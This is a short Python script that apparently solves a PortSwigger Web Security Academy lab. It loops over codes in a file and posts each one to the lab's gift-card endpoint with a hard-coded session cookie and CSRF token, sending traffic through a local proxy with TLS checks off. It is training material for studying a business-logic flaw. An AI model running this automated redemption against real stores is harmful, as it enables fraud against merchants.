import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0a0600c90374e256c2ccc5f4004a0060.web-security-academy.net/gift-card'
Cookies = {'session' : 'ako0fAsbbEvOISJhknGeI0bcBuixucEc'}
gift = open("gift_code.txt", "r")
def getmoney(file):
    for code in file.readlines() :
        code = code.strip("\n")
        data1 = {'csrf' : 'gK2sJ4iC32ERrm9KWQOj59w7NZTPnqTf', 'gift-card' : code}
        r = requests.post(URl, data=data1, verify=False, proxies=proxies, cookies=Cookies)

getmoney(gift)
